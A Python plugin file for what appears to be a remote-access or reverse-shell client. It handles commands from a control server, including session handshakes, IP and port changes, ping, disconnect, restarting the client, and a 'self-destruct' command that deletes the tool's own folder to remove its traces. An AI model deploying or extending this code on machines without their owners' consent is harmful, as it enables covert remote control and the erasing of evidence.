import shlex
import sys
import subprocess
import socket
from time import sleep
from os import getcwd
from shutil import rmtree
from os.path import realpath
from client import LoopController


class Plugin(object):
    version = 'v1.0'
    invocation = 'oyster'
    enabled = True
    required = True

    def run(self, client, data):
        args = shlex.split(data)

        if not args:
            client.server_print('Oyster requires arguments to run.\n')
            return

        # Handle the initial handshake.
        if args[0] == 'handshake':
            try:
                uuid = args[1]
            except IndexError:
                print('No sesssion-id provided.')
                client.send_data('False')
                return

            if uuid == client.session_id:
                if client.reconnect_to_session:
                    print('Connecting to session.')
                    client.send_data('True')
                    client.session_id = uuid
                    return
                print('Will not connect to current session')
                client.send_data('False')
                return
            else:
                client.send_data('True')
                client.session_id = uuid

        if args[0] == 'set-session-id':
            client.set_session_id(args[1])
            return

        if args[0] == 'set-port':
            client.send_data('Port set.')
            client.connected_port = args[1]
            return

        if args[0] == 'get-ip':
            client.send_data(client.ip_address)
            return

        if args[0] == 'set-ip':
            client.send_data('IP set.')
            client.ip_address = args[1]
            return

        if args[0] == 'disconnect':
            client.handle_disconnect()
            return

        # Reboot self
        if args[0] == 'shell-reboot':
            client.send_data('confirmed')
            client.sock.close()
            lc = LoopController()
            lc.should_break = True
            return lc

        # Get the current working directory.
        if args[0] == 'getcwd':
            self.send_data_with_cwd(client, '')
            return

        # Send a `pong` back to the server.
        if args[0] == 'ping':
            client.send_data('pong\n')
            return

        if args[0] == 'quit' or args[0] == 'exit':
            client.send_data('confirmed')
            sleep(1)
            lc = LoopController()
            lc.should_break = True
            return lc

        # Make the `client.py` script remove the `Oyster` folder and its contents.
        if args[0] == 'self-destruct':
            client.server_print('Self-destructing in..', terminate=False)
            client.server_print('5!', terminate=False)
            sleep(1)
            client.server_print('4!', terminate=False)
            sleep(1)
            client.server_print('3!', terminate=False)
            sleep(1)
            client.server_print('2!', terminate=False)
            sleep(1)
            client.server_print('1!', terminate=False)
            sleep(1)
            client.server_print('Boom!')

            self.self_destruct()
            sys.exit()

        # Check to see if the client should send the
        # server shutdown confirmation.
        if args[0] == 'server_shutdown?':
            self.negotiate_server_shutdown(client)
            return

        # Restart the `client.py` script.
        if args[0] == 'reboot':
            client.send_data('')
            self.reboot(client)
            sys.exit()

        return

    def self_destruct(self):
        """
        Destroy self.

        :return:
        """

        filename = __file__.split('/')[-1]
        cd = __file__.split('/')[-2]
        directory = __file__.replace(filename, '').replace(cd + '/', '')
        rmtree(directory)

    def negotiate_server_shutdown(self, client):
        """
        Negotiate a server shutdown.

        :return:
        """

        if client.server_shutdown:
            client.send_data('Y')
            client.sock.close()
            if client.shutdown_kill:
                sys.exit()
            client.reboot_self()
        else:
            client.send_data('N')
        return client

    def send_data_with_cwd(self, client, some_data):
        """
        Send something back to the control server with the current
        working directory appended to the end of it.

        :param some_data:
        :return:
        """

        client.sock.send(str.encode(some_data + str(getcwd()) + '> ' + '~!_TERM_$~'))
        return self

    def reboot(self, client):
        """
        Reboot the client.

        :return:
        """

        try:
            client.sock.close()
        except socket.error:
            pass

        rc = [
            sys.executable,
            'port={}'.format(client.port),
            'host={}'.format(client.host),
            'recv_size={}'.format(client.recv_size),
            'server_shutdown={}'.format(client.server_shutdown),
            'session_id='.format(client.session_id)
        ]

        try:
            popen_rc = [sys.executable] + list(sys.argv)
            p = subprocess.Popen(popen_rc)
            p.communicate()
        except PermissionError:
            from os import execv
            print('Using execv...')
            rc.pop(0)
            rc.insert(0, realpath(__file__))
            rc.insert(0, '')
            execv(sys.executable, rc)

        sys.exit()

